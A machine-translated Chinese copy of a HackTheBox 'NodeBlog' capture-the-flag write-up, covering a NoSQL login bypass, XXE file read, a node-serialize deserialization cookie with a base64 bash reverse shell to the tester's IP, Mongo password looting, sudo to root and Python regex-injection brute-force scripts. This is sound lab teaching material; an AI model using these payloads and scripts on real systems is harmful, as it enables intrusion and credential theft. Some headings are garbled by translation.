
  备份文件下载 ssh泄露  /反序列化 mongod提权

# HTB: NodeBlog

[0xdf.gitlab.io](https://0xdf.gitlab.io/2022/01/10/htb-nodeblog.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnodeblog-cover.) 

这个UHC限定符框是对一些常见NodeJS漏洞的巧妙理解。首先是一个 NoSQL 身份验证绕过。然后，我将在一些帖子上传功能中使用XXE来泄漏文件，包括站点源。有了这个，我将发现一个反序列化漏洞，我可以滥用它来获得RCE。我将通过外壳程序或NoSQL注入从Mongo获取用户的密码，并使用它来升级到root。在“超越根”中，查看破坏反序列化有效负载的字符，以及编写 NoSQL 注入脚本的脚本。

## 箱子信息

名字

[节点博客](https://www.hackthebox.eu/home/machines/profile/430) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-nodeblog.png) 

发行日期

10 1月 2022

停用日期

10 1月 2022

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

不适用（非竞争性）

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

不适用（非竞争性）

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F3769)](https://www.hackthebox.eu/home/users/profile/3769)-

## 侦察

### n地图

`nmap`找到两个打开的 TCP 端口，即固态混合端口 （22） 和 HTTP （80）：

    oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.139
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-09 13:30 EST
    Nmap scan report for 10.10.11.139
    Host is up (0.10s latency).
    Not shown: 65533 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    5000/tcp open  upnp
    
    Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
    oxdf@parrot$ nmap -p 22,5000 -sCV -oA scans/nmap-tcpscripts 10.10.11.139
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-09 13:33 EST
    Nmap scan report for 10.10.11.139
    Host is up (0.092s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    5000/tcp open  http    Node.js (Express middleware)
    |_http-title: Blog
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 15.49 seconds
    

基于[开放SSH](https://packages.ubuntu.com/search?keywords=openssh-server)版本，主机可能运行的是乌班图20.04焦点。该网站（不出所料地基于框名称）运行NodeJS。

### 网站 - TCP 80

#### 网站

该页面是关于UHC的博客，只有一篇文章：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220110115720971.png) 

单击“阅读更多”将转到 ，这是包含一些链接的完整帖子，所有这些链接都指向公共站点（超出范围）：`http://10.10.11.139:5000/articles/uhc-qualifiers`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220109134724240.png) 

“登录”按钮指向 ，这是一个登录表单：`/login`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220110115752224.png) 

#### 技术堆栈

`nmap`已识别站点正在运行带有快速的节点JS。响应标头证实了这一点，但没有指出太多其他内容：

    HTTP/1.1 200 OK
    X-Powered-By: Express
    Content-Type: text/html; charset=utf-8
    Content-Length: 1891
    ETag: W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"
    Date: Sun, 09 Jan 2022 22:49:52 GMT
    Connection: close
    

#### 目录暴力破解

我将与该网站运行：`feroxbuster`

    oxdf@parrot$ feroxbuster -u http://10.10.11.139:5000
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.4.0
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.11.139:5000
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.4.0
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    200       28l       59w     1002c http://10.10.11.139:5000/login
    200       28l       59w     1002c http://10.10.11.139:5000/Login
    200       28l       59w     1002c http://10.10.11.139:5000/LOGIN
    [####################] - 58s    29999/29999   0s      found:3       errors:0
    [####################] - 58s    29999/29999   515/s   http://10.10.11.139:5000
    

没有什么是我还不知道的。

## 壳牌作为管理员

### 通过无 SQL 注入进行身份验证旁路

一些基本的SQL注入没有做任何事情，也没有对登录表单进行快速运行。`sqlmap`

测试NoSQL注入比SQL注入的一些简单检查要棘手一些。PayloadsAllThings有一[个很好的有效负载部分](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass)用于NoSQL身份验证绕过，作为我将在这里展示的内容的方便参考。在这里，我们希望节点将输入作为 JSON 对象进行处理。默认情况下，页面以 HTML 表单的形式提交（这由请求中的标题设置）：`Content-Type`

    POST /login HTTP/1.1
    Host: 10.10.11.139:5000
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 29
    Origin: http://10.10.11.139:5000
    Connection: close
    Referer: http://10.10.11.139:5000/login
    Upgrade-Insecure-Requests: 1
    
    user=admin&password=wrongpassword
    

在这种格式中，我可以尝试将数据更改为：

    user=admin&password[$ne]=wrongpassword
    

如果服务器按照我想要的方式解释，它将使其查找密码不等于“错误密码”的记录，这将返回管理记录。

我会将登录POST请求发送到Burp中继器并尝试一下，但它不起作用。

发送数据的另一种方式是 JSON 格式。我将更改标头，然后将正文转换为 JSON（首先不进行任何注入，以确保站点正确处理它）：`Content-Type`

    POST /login HTTP/1.1
    Host: 10.10.11.139:5000
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/json
    Content-Length: 46
    Origin: http://10.10.11.139:5000
    Connection: close
    Referer: http://10.10.11.139:5000/login
    Upgrade-Insecure-Requests: 1
    
    {"user": "admin", "password": "wrongpassword"}
    

发送该邮件会返回“密码无效”消息，该消息显示用户名已处理并匹配。我将字符串“错误密码”替换为一个 JSON 对象，该对象使用运算符查找具有用户名管理员且没有该密码的记录：`$ne`

    {"user": "admin", "password": {"$ne": "wrongpassword"}}
    

发送该消息后，响应会返回一个cookie，这很好地表明我已成功登录。

我可以抓取该 Cookie 并使用开发工具将其添加到火狐中。或者，我可以在Burp中打开拦截，从Firefore提交登录信息，以与在中继器中相同的方式对其进行修改，然后转发它。无论哪种方式，我在火狐中有一个登录的会话：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220110115840824.png) 

身份验证绕过是我从这个NoSQL注入所需要的，但我也可以从数据库中转储用户名和密码。我将在“超越根”中展示这一点。

### 文件读取

#### 站点枚举

登录的站点还有几个按钮。“新文章”指向 ，这是用于创建新文章的形式：`/articles/new`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220110080833417.png) 

我尝试提交一篇文章，它的工作原理：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220110083732854.png) 

我可以编辑文章并删除它们。

还有“上传”按钮。单击它可从我的操作系统中弹出文件选择界面。

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220110084031580.png) 

看看响应，它更清晰一些（因为火狐将标签视为HTML）：

    HTTP/1.1 200 OK
    X-Powered-By: Express
    Content-Type: text/html; charset=utf-8
    Content-Length: 144
    ETag: W/"90-v0DoTdXwQk7iInwC6sdbQSWTk3E"
    Date: Mon, 10 Jan 2022 17:49:14 GMT
    Connection: close
    
    Invalid XML Example: <post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
    

我创建了一个虚拟的XML文件，其格式与服务器发送的格式相同：

    <post>
            <title>0xdf's Post</title>
            <description>A post from 0xdf</description>
            <markdown>
    ## post
    This is a test post.
            </markdown>
    </post>
    

在上传时，它会导致，看起来像已经填写了提交表单：`/articles/xml`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220110090421985.png) 

#### 断续器

该网站显然接受XML并将其解析为表单以显示给我。这是 XML 外部实体 （XXE） 注入的经典机会 - 我将看看我是否可以让 XML 进程以将其作为代码处理的方式处理我的输入。这是一类类似于SSTI（模板注入）甚至Log4j的错误。

有效载荷所有事物也有很多用于XXE[的示例有效载荷](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files)。我会抓住第一个并尝试阅读.我不能只是按原样提交它，我必须从网站期望的模板开始工作。我将我的 XML 文件更新为：`/etc/passwd`

    <?xml version="1.0"?>
    <!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///etc/passwd">
    ]>
    <post>
            <title>0xdf's Post</title>
            <description>Read File</description>
            <markdown>&file;</markdown>
    </post>
    
    

这会将实体定义为 的内容，然后在 markdown 字段中引用它。当我提交这个时，它的工作原理：`&file;``/etc/passwd`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220110123114923.png) 

### 查找源位置

在对各种文件没有找到太多兴趣之后，我发现自己试图使网站崩溃。XML 中的错误只会导致示例负载。URL 中的错误会给出简单的消息，如 。有一件事是将破坏的 JSON 发送到 ：`Cannot GET /a``/login`

    POST /login HTTP/1.1
    Host: 10.10.11.139:5000
    Content-Type: application/json
    Content-Length: 1
    
    {
    

响应包括堆栈跟踪：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20220110131328282.png) 

似乎 Web 应用的源代码正在 中运行。`/opt/blog`

### 反序列化

#### 来源分析

我将在（ 是 Node 应用程序的通用名称）找到应用程序的源代码。`/opt/blog/server.js``server.js`

    const express = require('express')
    const mongoose = require('mongoose')
    const Article = require('./models/article')
    const articleRouter = require('./routes/articles')
    const loginRouter = require('./routes/login')
    const serialize = require('node-serialize')
    const methodOverride = require('method-override')
    const fileUpload = require('express-fileupload')
    const cookieParser = require('cookie-parser');
    const crypto = require('crypto')
    const cookie_secret = "UHC-SecretCookie"
    //var session = require('express-session');
    const app = express()
    
    mongoose.connect('mongodb://localhost/blog')
    
    app.set('view engine', 'ejs')
    app.use(express.urlencoded({ extended: false }))
    app.use(methodOverride('_method'))
    app.use(fileUpload())
    app.use(express.json());
    app.use(cookieParser());
    //app.use(session({secret: "UHC-SecretKey-123"}));
    
    function authenticated(c) {
        if (typeof c == 'undefined')
            return false
    
        c = serialize.unserialize(c)
    
        if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
            return true
        } else {
            return false
        }
    }
    
    
    app.get('/', async (req, res) => {
        const articles = await Article.find().sort({
            createdAt: 'desc'
        })
        res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
    })
    
    app.use('/articles', articleRouter)
    app.use('/login', loginRouter)
    
    
    app.listen(5000)
    

对我来说，这是的导入，这意味着正在使用序列化，这始终是一条有风险的道路。`node-serialize`

该函数正在 被调用，这可能是 cookie。看看饼干，它显然是网址编码的 JSON：`unserialize``c`

    %7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D
    

这将解码为：

    {"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
    

值得注意的是，Cookie中的所有非字母/数字都是URL编码的。

#### 利用可编程逻辑控制器

[这篇博客文章](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)很好地编写了利用节点序列化的路径。他们给出的示例有效负载是：

    {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /',
    function(error, stdout, stderr) { console.log(stdout) });}()"}
    

源代码清楚地表明，这是在或字段之前检查的，所以我可以把它变成我的cookie。我将从以下几点开始：`user``sign`

    {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 10.10.14.8', function(error, stdout, stderr){console.log(stdout)});}()"}
    

此 URL 编码为：

    %7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%70%69%6e%67%20%2d%63%20%31%20%31%30%2e%31%30%2e%31%34%2e%38%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d
    

URL编码很重要（我将看看为什么我需要在“超越根”中对此进行URL编码）。

我将启动 ，并在中继器中发送此内容，这将导致 ICMP 数据包：`tcpdump`

    oxdf@parrot$ sudo tcpdump -ni tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    13:37:28.886060 IP 10.10.11.139 > 10.10.14.8: ICMP echo request, id 1, seq 1, length 64
    13:37:28.886083 IP 10.10.14.8 > 10.10.11.139: ICMP echo reply, id 1, seq 1, length 64
    

#### 壳

我玩了一些东西，但最终得到了一个base64编码的bash反向外壳。我在自己的终端中创建了它：

    oxdf@parrot$ echo 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1' | base64
    YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg==
    

然后通过运行并确保它已连接来测试它是否有效：

    oxdf@parrot$ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg==|base64 -d|bash
    

然后重置并将有效负载放入 GET 请求中：`nc`

    GET / HTTP/1.1
    Host: 10.10.11.139:5000
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: close
    Cookie: auth=%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%65%63%68%6f%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%34%4c%7a%51%30%4d%79%41%77%50%69%59%78%43%67%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d
    Upgrade-Insecure-Requests: 1
    Set-GPC: 1
    

在发送中继器时，我得到了一个外壳：

    oxdf@parrot$ nc -lnvp 443
    Listening on 0.0.0.0 443
    Connection received on 10.10.11.139 38464
    bash: cannot set terminal process group (849): Inappropriate ioctl for device
    bash: no job control in this shell
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.
    
    bash: /home/admin/.bashrc: Permission denied
    admin@nodeblog:/opt/blog$
    

我将使用技巧升级它：`script`

    admin@nodeblog:/opt/blog$ script /dev/null -c bash
    script /dev/null -c bash
    Script started, file is /dev/null
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.
    
    bash: /home/admin/.bashrc: Permission denied
    admin@nodeblog:/opt/blog$ ^Z
    [1]+  Stopped                 nc -lnvp 443
    oxdf@parrot$ stty raw -echo; fg
    nc -lnvp 443
                reset
    admin@nodeblog:/opt/blog$
    

### 用户.txt

至少在最初部署到 HTB 时，计算机在 上以奇怪的权限退出。当我加载外壳并得到一个错误时，这是第一次可见的：“bash： /home/admin/.bashrc： 权限被拒绝”。`/home/admin`

该目录设置为 644：

    admin@nodeblog:/home$ ls -l
    total 0
    drw-r--r-- 1 admin admin 220 Jan  3 17:16 admin
    

没有目录，我就不能进入它。有趣的是，即使管理员可读，我也无法阅读它：`x``user.txt`

    admin@nodeblog:/home$ cat admin/user.txt
    cat: admin/user.txt: Permission denied
    

但是，由于管理员是目录的所有者，我可以更改权限并获取标志：

    admin@nodeblog:/home$ chmod +x admin/
    admin@nodeblog:/home$ cd admin/
    admin@nodeblog:~$ cat user.txt
    621989e8************************
    

这也许是固定的，但这是对Linux文件权限的有趣探索。

## 外壳作为根

### 列举

#### 常规

没有其他感兴趣的内容。 请求管理员用户的密码：`/home/admin``sudo`

    admin@nodeblog:~$ sudo -l     
    [sudo] password for admin: 
    

看看主机上运行的内容，我会看到：`mongod`

    admin@nodeblog:~$ ps auxww
    ...[snip]...
    mongodb      693  0.3  1.8 983884 76276 ?        Ssl  Jan10   0:39 /usr/bin/mongod --unixSocketPrefix=/run/mongodb --config /etc/mongodb.conf
    ...[snip]...
    

该配置显示它正在侦听默认端口 27017，该端口位于 ：`netstat`

    admin@nodeblog:~$ netstat -tnlp
    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
    tcp6       0      0 :::22                   :::*                    LISTEN      -                   
    tcp6       0      0 :::5000                 :::*                    LISTEN      849/node /opt/blog/ 
    

#### 蒙戈

有几种方法可以从Mongo获取数据。 将连接到没有其他参数的本地实例：`mongo`

    admin@nodeblog:~$ mongo
    MongoDB shell version v3.6.8
    connecting to: mongodb://127.0.0.1:27017
    Implicit session: session { "id" : UUID("6c8944d0-e1f8-4ccb-9613-a4bec8925cb1") }
    MongoDB server version: 3.6.8
    Server has startup warnings: 
    2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] 
    2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
    2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
    2022-01-10T21:09:16.064+0000 I CONTROL  [initandlisten] 
    > 
    

我可以显示数据库：

    > show dbs
    admin   0.000GB
    blog    0.000GB
    config  0.000GB
    local   0.000GB
    

除 之外，所有这些都是[Mongo中的默认数据库](https://www.mysoftkey.com/mongodb/3-default-database-in-mongodb/)。我会看看：`blog``blog`

    > use blog
    switched to db blog
    > show collections
    articles
    users
    

两个集合，显然更令人感兴趣，因为它可能包含身份验证信息。实际上，它具有管理员的纯文本密码：`users`

    > db.users.find()
    { "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
    

获取相同信息的另一种方法是使用 。从一个空目录中，我将运行它：`mongodump`

    admin@nodeblog:/dev/shm$ mongodump 
    2022-01-11T00:41:49.300+0000    writing admin.system.version to 
    2022-01-11T00:41:49.301+0000    done dumping admin.system.version (1 document)
    2022-01-11T00:41:49.301+0000    writing blog.articles to 
    2022-01-11T00:41:49.301+0000    writing blog.users to 
    2022-01-11T00:41:49.301+0000    done dumping blog.articles (2 documents)
    2022-01-11T00:41:49.301+0000    done dumping blog.users (1 document)
    

所有数据都已写入 ：`dump`

    admin@nodeblog:/dev/shm$ ls
    dump  multipath
    admin@nodeblog:/dev/shm$ ls dump/
    admin  blog
    

中有四个文件：`blog`

    admin@nodeblog:/dev/shm$ ls dump/blog/
    articles.bson  articles.metadata.json  users.bson  users.metadata.json
    

这些文件并不有趣。这些文件是二进制的：`metadata.json``.bson`

    admin@nodeblog:/dev/shm$ xxd dump/blog/users.bson 
    00000000: 6e00 0000 075f 6964 0061 b738 0ae5 814d  n...._id.a.8...M
    00000010: f603 0d23 7309 6372 6561 7465 6441 7400  ...#s.createdAt.
    00000020: 19e7 b2b3 7d01 0000 0275 7365 726e 616d  ....}....usernam
    00000030: 6500 0600 0000 6164 6d69 6e00 0270 6173  e.....admin..pas
    00000040: 7377 6f72 6400 1a00 0000 4970 7073 6563  sword.....Ippsec
    00000050: 5361 7973 506c 6561 7365 5375 6273 6372  SaysPleaseSubscr
    00000060: 6962 6500 105f 5f76 0000 0000 0000       ibe..__v......
    

虽然我可以从中获取密码，但阅读起来会很好：`bsondump`

    admin@nodeblog:/dev/shm$ bsondump dump/blog/users.bson
    {"_id":{"$oid":"61b7380ae5814df6030d2373"},"createdAt":{"$date":"2021-12-13T12:09:46.009Z"},"username":"admin","password":"IppsecSaysPleaseSubscribe","__v":0}
    2022-01-11T00:43:37.566+0000    1 objects found
    

### 苏多苏

事实证明，管理员在网站和主机之间重复使用其密码，因为它在提示时起作用：`sudo`

    admin@nodeblog:/dev/shm$ sudo -l
    [sudo] password for admin: 
    Matching Defaults entries for admin on nodeblog:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User admin may run the following commands on nodeblog:
        (ALL) ALL
        (ALL : ALL) ALL
    

而且，管理员可以以root身份运行任何内容。 将返回一个根外壳：`sudo su`

    admin@nodeblog:/dev/shm$ sudo su
    root@nodeblog:/dev/shm#
    

我可以读到：`root.txt`

    root@nodeblog:~# cat root.txt
    8c01d129************************
    

## 超越根

### 反序列化有效负载中的错误字符

对于反序列化有效负载，当我在Burp中使用ctrl-u对关键字符进行“编码”时，有效负载不起作用。当我对所有字符进行编码时，它确实进行了编码。我想弄清楚是什么打破了它。我将[在本视频](https://www.youtube.com/watch?v=MT3wwqIAU1c)中进行一些探讨：

答案是两件事。如果没有编码，它会因为 .这表示HTTP中饼干的结束，因此破坏了事情。因此，当我按Ctrl-u时，这是固定的。但是 ctrl-u 也用 替换空格，这似乎也破坏了这个应用程序。用空格 或 替换它们时，有效负载工作正常。`;``+``%20`

故事的寓意 - 注意编码。

### 数据采集

我能够使用NoSQL注入来绕过登录表单上的身份验证。我还可以使用它来枚举查询中使用的至少字段。我从一个脚本开始，该脚本将给我盒子上的所有帐户。

    #!/usr/bin/env python3
    
    import requests
    import string
    
    
    def brute_username(user):
        for c in string.ascii_lowercase:
            print(f'\r{user}{c:<50}', end='')
            payload = { 'user':
                           { '$regex' : f'^{user}{c}' },
                        'password': '0xdf'
                      }
            resp = requests.post('http://10.10.11.139:5000/login', json=payload)
    
            if 'Invalid Password' in resp.text:
                payload = {'user': f'{user}{c}', 'password': '0xdf'}
                resp = requests.post('http://10.10.11.139:5000/login', json=payload)
                if 'Invalid Password' in resp.text:
                    print(f'\r{user}{c}')
                brute_username(f'{user}{c}')
    
    
    brute_username('')
    print('\r', end='')
    

它是一个递归函数，它尝试当前字符串和一个新字符，并使用正则表达式搜索来查看是否有用户以该模式开头。如果有，它会检查该新字符串是否为有效用户，如果是，则打印它。然后，它继续以任何一种方式检查下一个字符。例如，如果同时有管理员和管理员，那么捕获这一点很重要。

事实证明，只有一个用户，管理员：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnodeblog-brute-users.gif)

我将编写另一个快速脚本，该脚本将采用用户名并获取密码。我最初跳过了这个，假设密码将是我还不需要的哈希值。直到后来我才发现这是一个明文密码，我需要解决这个盒子。

这一次，我知道给定用户只有一个有效的密码，所以我可以使用一个简单的循环，直到我找到它：`while`

    #!/usr/bin/env python3
    
    import requests
    import string
    import sys
    
    
    user = sys.argv[1]
    password = ''
    found = False
    
    while not found:
        for c in string.ascii_letters + string.digits + '!@#$%^&,':
            print(f'\r{password}{c:<50}', end='')
            payload = { 'user': user,
                        'password':
                           { '$regex' : f'^{password}{c}' },
                      }
            resp = requests.post('http://10.10.11.139:5000/login', json=payload)
    
            if not 'Invalid Password' in resp.text:
                payload = {'user': user, 'password': password + c}
                resp = requests.post('http://10.10.11.139:5000/login', json=payload)
                password += c
                if not 'Invalid Password' in resp.text:
                    print(f'\r{password}')
                    found = True
                break
    

它很快就能找到密码：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fnodeblog-brute-password.gif)

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2022/01/10/htb-nodeblog.html)